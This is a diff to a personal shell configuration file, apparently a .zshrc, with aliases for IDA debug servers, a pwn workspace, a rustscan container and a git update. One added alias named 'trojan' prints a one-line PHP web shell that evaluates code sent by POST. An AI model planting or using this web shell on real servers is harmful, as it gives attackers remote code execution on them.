@@ -7,6 +7,7 @@ alias baidu="curl baidu.com"
 alias idax86="cd ~/ida && ./linux_server"
 alias idax64="cd ~/ida && ./linux_server64"
 alias pwn="code ~/pwn"
+alias update="cd ~/maintain && git pull"
 # for ubuntu Desktop
 # for m1 MACbook
 if [[ $UNAME =~ "Mac" ]]
@@ -27,6 +28,7 @@ then
 fi
 # hacker
 alias rustscan='docker run -it --rm --name rustscan rustscan/rustscan:2.0.0'
+alias trojan="echo '<?php @eval(\$_POST['attack']);?>'"
 
 ZSH_THEME="ys"
 
